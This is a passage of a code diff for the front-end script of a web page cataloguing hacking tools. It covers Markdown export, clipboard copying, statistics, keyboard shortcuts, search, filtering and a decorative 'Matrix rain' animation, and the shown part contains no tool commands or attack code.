+            const blob = new Blob([markdown], { type: 'text/markdown' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `${tool}_commands.md`;
+            a.click();
+            URL.revokeObjectURL(url);
+            
+            showNotification('Tool data exported successfully!', 'success');
+        }
+
+        document.querySelector(".close").onclick = function() {
+            document.getElementById("toolModal").style.display = "none";
+        }
+
+        window.onclick = function(event) {
+            const modal = document.getElementById("toolModal");
+            if (event.target == modal) {
+                modal.style.display = "none";
+            }
+        }
+        
+        // New Bulk Action Functions
+        function exportAllTools() {
+            let allToolsMarkdown = `# Complete Hacking Tools Library - All Tools\n\n`;
+            allToolsMarkdown += `**Generated:** ${new Date().toLocaleString()}\n`;
+            allToolsMarkdown += `**Total Categories:** ${Object.keys(toolsData).length}\n`;
+            allToolsMarkdown += `**Total Tools:** ${Object.values(toolsData).reduce((total, category) => total + Object.keys(category).length, 0)}\n\n`;
+            allToolsMarkdown += `---\n\n`;
+            
+            Object.keys(toolsData).forEach(category => {
+                allToolsMarkdown += `## ${category}\n\n`;
+                Object.keys(toolsData[category]).forEach(tool => {
+                    const toolData = toolsData[category][tool];
+                    allToolsMarkdown += `### ${tool}\n`;
+                    allToolsMarkdown += `**Description:** ${toolData.description}\n`;
+                    allToolsMarkdown += `**Difficulty:** ${getToolDifficulty(tool)}\n\n`;
+                    
+                    allToolsMarkdown += `#### Commands:\n`;
+                    toolData.commands.forEach((cmd, index) => {
+                        if (typeof cmd === 'object' && cmd.command) {
+                            allToolsMarkdown += `${index + 1}. \`${cmd.command}\`\n`;
+                            allToolsMarkdown += `   - **Explanation:** ${cmd.explanation}\n`;
+                            allToolsMarkdown += `   - **Expected Result:** ${cmd.result}\n\n`;
+                        } else {
+                            allToolsMarkdown += `${index + 1}. \`${cmd}\`\n\n`;
+                        }
+                    });
+                    
+                    if (toolData.scenarios) {
+                        allToolsMarkdown += `#### Scenarios:\n`;
+                        toolData.scenarios.forEach((scenario, index) => {
+                            allToolsMarkdown += `${index + 1}. **${scenario.name}**\n`;
+                            allToolsMarkdown += `   - ${scenario.description}\n`;
+                            allToolsMarkdown += `   - **Expected Result:** ${scenario.expectedResult}\n`;
+                            allToolsMarkdown += `   - **Fallback Strategy:** ${scenario.fallbackStrategy}\n\n`;
+                        });
+                    }
+                    allToolsMarkdown += `---\n\n`;
+                });
+            });
+            
+            const blob = new Blob([allToolsMarkdown], { type: 'text/markdown' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'Complete_Hacking_Tools_Library.md';
+            a.click();
+            URL.revokeObjectURL(url);
+            
+            showNotification('All tools exported successfully!', 'success');
+        }
+        
+        function copyAllTools() {
+            let allCommands = `# Complete Hacking Tools Library - All Commands\n\n`;
+            allCommands += `Generated: ${new Date().toLocaleString()}\n\n`;
+            
+            Object.keys(toolsData).forEach(category => {
+                allCommands += `## ${category}\n\n`;
+                Object.keys(toolsData[category]).forEach(tool => {
+                    const toolData = toolsData[category][tool];
+                    allCommands += `### ${tool}\n`;
+                    toolData.commands.forEach((cmd, index) => {
+                        if (typeof cmd === 'object' && cmd.command) {
+                            allCommands += `${cmd.command}\n`;
+                        } else {
+                            allCommands += `${cmd}\n`;
+                        }
+                    });
+                    allCommands += `\n`;
+                });
+            });
+            
+            navigator.clipboard.writeText(allCommands).then(() => {
+                showNotification('All commands copied to clipboard!', 'success');
+            }).catch(() => {
+                showNotification('Failed to copy commands', 'error');
+            });
+        }
+        
+        function showToolStats() {
+            let totalTools = 0;
+            let totalCommands = 0;
+            let difficultyStats = { 'Beginner': 0, 'Intermediate': 0, 'Advanced': 0 };
+            
+            Object.keys(toolsData).forEach(category => {
+                Object.keys(toolsData[category]).forEach(tool => {
+                    totalTools++;
+                    totalCommands += toolsData[category][tool].commands.length;
+                    const difficulty = getToolDifficulty(tool);
+                    difficultyStats[difficulty]++;
+                });
+            });
+            
+            const statsMessage = `📊 Tool Statistics:
+            
+🏆 Total Categories: ${Object.keys(toolsData).length}
+🔧 Total Tools: ${totalTools}
+⚡ Total Commands: ${totalCommands}
+
+📈 Difficulty Distribution:
+🟢 Beginner: ${difficultyStats['Beginner']} tools
+🟡 Intermediate: ${difficultyStats['Intermediate']} tools  
+🔴 Advanced: ${difficultyStats['Advanced']} tools
+
+💡 Average Commands per Tool: ${Math.round(totalCommands / totalTools)}`;
+            
+            showNotification(statsMessage, 'info');
+        }
+
+        displayCategories();
+        
+        // Matrix Rain Effect
+        function createMatrixRain() {
+            const matrixContainer = document.getElementById('matrix-rain');
+            
+            // Check if container exists
+            if (!matrixContainer) {
+                console.error('Matrix rain container not found!');
+                return;
+            }
+            
+            console.log('Matrix rain starting...');
+            
+            // Add a visible indicator that Matrix rain is working
+            const indicator = document.createElement('div');
+            indicator.style.position = 'fixed';
+            indicator.style.top = '10px';
+            indicator.style.right = '10px';
+            indicator.style.color = '#00ff41';
+            indicator.style.fontFamily = "'Share Tech Mono', monospace";
+            indicator.style.fontSize = '12px';
+            indicator.style.zIndex = '1000';
+            indicator.style.textShadow = '0 0 5px #00ff41';
+            indicator.textContent = 'MATRIX RAIN ACTIVE';
+            document.body.appendChild(indicator);
+            
+            // Remove indicator after 3 seconds
+            setTimeout(() => {
+                if (indicator.parentNode) {
+                    indicator.parentNode.removeChild(indicator);
+                }
+            }, 3000);
+            
+            const chars = 'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+-=[]{}|;:,.<>?';
+            const charArray = chars.split('');
+            
+            function createMatrixColumn() {
+                const column = document.createElement('div');
+                column.style.position = 'absolute';
+                column.style.left = Math.random() * 100 + '%';
+                column.style.top = '-20px';
+                column.style.fontFamily = "'Share Tech Mono', monospace";
+                column.style.fontSize = '18px';
+                column.style.color = '#00ff41';
+                column.style.opacity = '1';
+                column.style.textShadow = '0 0 5px #00ff41, 0 0 10px #00ff41, 0 0 15px #00ff41, 0 0 20px #00ff41';
+                column.style.fontWeight = 'bold';
+                column.style.animation = `matrix-fall ${3 + Math.random() * 4}s linear infinite`;
+                column.style.animationDelay = Math.random() * 2 + 's';
+                
+                // Add random characters
+                const charCount = 10 + Math.random() * 20;
+                let text = '';
+                for (let i = 0; i < charCount; i++) {
+                    text += charArray[Math.floor(Math.random() * charArray.length)] + '\n';
+                }
+                column.textContent = text;
+                
+                matrixContainer.appendChild(column);
+                
+                // Remove column after animation
+                setTimeout(() => {
+                    if (column.parentNode) {
+                        column.parentNode.removeChild(column);
+                    }
+                }, 7000);
+            }
+            
+            // Create new columns periodically
+            setInterval(createMatrixColumn, 100);
+            
+            // Create initial columns
+            for (let i = 0; i < 20; i++) {
+                setTimeout(createMatrixColumn, i * 200);
+            }
+        }
+        
+        // Start Matrix Rain after DOM is loaded
+        window.addEventListener('load', function() {
+            createMatrixRain();
+        });
+        
+        // Keyboard Shortcuts for Power Users
+        document.addEventListener('keydown', function(e) {
+            // Ctrl + F: Focus search bar
+            if (e.ctrlKey && e.key === 'f') {
+                e.preventDefault();
+                document.getElementById('searchInput').focus();
+                showNotification('Search focused! Type to search tools...', 'info');
+                return;
+            }
+            
+            // Escape: Close any open modals
+            if (e.key === 'Escape') {
+                const modal = document.getElementById('toolModal');
+                if (modal && modal.style.display !== 'none') {
+                    modal.style.display = 'none';
+                    showNotification('Modal closed', 'info');
+                }
+                return;
+            }
+            
+            // Ctrl + A: Select all commands (when modal is open)
+            if (e.ctrlKey && e.key === 'a') {
+                const modal = document.getElementById('toolModal');
+                if (modal && modal.style.display !== 'none') {
+                    e.preventDefault();
+                    // Copy all commands from currently open tool
+                    const modalTitle = modal.querySelector('h2');
+                    if (modalTitle) {
+                        const toolName = modalTitle.textContent;
+                        // Find the tool data and copy all commands
+                        copyAllCommandsFromModal(toolName);
+                    }
+                }
+                return;
+            }
+            
+            // Enter: Open first visible tool (when search is focused)
+            if (e.key === 'Enter' && document.activeElement.id === 'searchInput') {
+                const firstVisibleTool = document.querySelector('.tool-card[style*="block"], .tool-card:not([style*="none"])');
+                if (firstVisibleTool) {
+                    firstVisibleTool.click();
+                    showNotification('Opening first tool...', 'info');
+                }
+                return;
+            }
+            
+            // Number keys 1-4: Switch difficulty filters
+            if (e.key >= '1' && e.key <= '4') {
+                const filterButtons = document.querySelectorAll('.filter-btn');
+                const keyMap = { '1': 0, '2': 1, '3': 2, '4': 3 }; // All, Beginner, Intermediate, Advanced
+                const buttonIndex = keyMap[e.key];
+                if (filterButtons[buttonIndex]) {
+                    filterButtons[buttonIndex].click();
+                    showNotification(`Filter switched to: ${filterButtons[buttonIndex].textContent}`, 'info');
+                }
+                return;
+            }
+            
+            // Ctrl + Shift + H: Show keyboard shortcuts help
+            if (e.ctrlKey && e.shiftKey && e.key === 'H') {
+                e.preventDefault();
+                showKeyboardShortcutsHelp();
+                return;
+            }
+        });
+        
+        function copyAllCommandsFromModal(toolName) {
+            // Find the tool in toolsData and copy all commands
+            Object.keys(toolsData).forEach(category => {
+                if (toolsData[category][toolName]) {
+                    copyToolCommands(category, toolName);
+                    showNotification(`All commands copied for ${toolName}!`, 'success');
+                    return;
+                }
+            });
+        }
+        
+        function showKeyboardShortcutsHelp() {
+            const helpText = `⌨️ KEYBOARD SHORTCUTS:
+            
+🔍 Ctrl + F: Focus search bar
+🚪 Escape: Close modals
+📋 Ctrl + A: Copy all commands (in modal)
+⏎ Enter: Open first tool (when search focused)
+🔢 1-4: Switch filters (All/Beginner/Intermediate/Advanced)
+❓ Ctrl + Shift + H: Show this help
+            
+💡 Pro tip: Use these shortcuts for faster workflow!`;
+            
+            showNotification(helpText, 'info');
+        }
+
+        // Search functionality
+        document.getElementById('searchInput').addEventListener('input', function(e) {
+            const searchTerm = e.target.value.toLowerCase();
+            const categories = document.querySelectorAll('.category');
+            
+            categories.forEach(category => {
+                const tools = category.querySelectorAll('.tool-card');
+                let visibleTools = 0;
+                
+                tools.forEach(tool => {
+                    const toolName = tool.querySelector('.tool-name').textContent.toLowerCase();
+                    const description = tool.querySelector('.tool-description').textContent.toLowerCase();
+                    
+                    // Get the tool data to search in commands as well
+                    const toolNameFromCard = tool.querySelector('.tool-name').textContent;
+                    const categoryName = category.querySelector('h3').textContent.split(' ')[0]; // Get category name
+                    
+                    let matchesCommand = false;
+                    if (toolsData[categoryName] && toolsData[categoryName][toolNameFromCard]) {
+                        const toolData = toolsData[categoryName][toolNameFromCard];
+                        matchesCommand = toolData.commands.some(cmd => {
+                            if (typeof cmd === 'object' && cmd.command) {
+                                return cmd.command.toLowerCase().includes(searchTerm) ||
+                                       cmd.explanation.toLowerCase().includes(searchTerm) ||
+                                       cmd.result.toLowerCase().includes(searchTerm);
+                            } else {
+                                return cmd.toLowerCase().includes(searchTerm);
+                            }
+                        });
+                    }
+                    
+                    if (toolName.includes(searchTerm) || description.includes(searchTerm) || matchesCommand) {
+                        tool.style.display = 'block';
+                        visibleTools++;
+                    } else {
+                        tool.style.display = 'none';
+                    }
+                });
+                
+                // Show/hide category based on visible tools
+                if (visibleTools > 0) {
+                    category.style.display = 'block';
+                } else {
+                    category.style.display = 'none';
+                }
+            });
+        });
+        
+        // Filter functionality
+        document.querySelectorAll('.filter-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+                this.classList.add('active');
+                
+                const filter = this.dataset.filter;
+                const categories = document.querySelectorAll('.category');
+                
+                categories.forEach(category => {
+                    const tools = category.querySelectorAll('.tool-card');
+                    tools.forEach(tool => {
+                        const difficulty = tool.querySelector('.difficulty-badge').textContent.toLowerCase();
+                        if (filter === 'all' || difficulty === filter) {
+                            tool.style.display = 'block';
+                        } else {
+                            tool.style.display = 'none';
+                        }
+                    });
+                });
+            });
+        });
+        
+        // Initialize favorites
+        updateFavoriteButtons();
+
+        // Matrix rain effect
+        function createMatrixRain() {
+            const matrixBg = document.getElementById('matrixBg');
+            const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン';
+            const fontSize = 14;
+            const columns = Math.floor(window.innerWidth / fontSize);
+            
+            for (let i = 0; i < columns; i++) {
+                const char = document.createElement('div');
+                char.className = 'matrix-char';
+                char.style.left = i * fontSize + 'px';
+                char.style.animationDelay = Math.random() * 2 + 's';
+                char.style.animationDuration = (Math.random() * 3 + 2) + 's';
+                char.textContent = chars[Math.floor(Math.random() * chars.length)];
+                matrixBg.appendChild(char);
+            }
+        }
+        
+        // Initialize matrix rain
+        createMatrixRain();
+        
+        // Recreate matrix rain on window resize
+        window.addEventListener('resize', () => {
+            const matrixBg = document.getElementById('matrixBg');
+            matrixBg.innerHTML = '';
+            createMatrixRain();
+        });
+    </script>
+
+    <footer style="text-align: center; color: #666; padding: 20px; border-top: 1px solid #ddd; margin-top: 40px;">
+        <p>&copy; 2024 Ahmed Hussein, Security Coordinator</p>
+        <p>Happy Hacking!</p>
+    </footer>
+</body>
+</html>
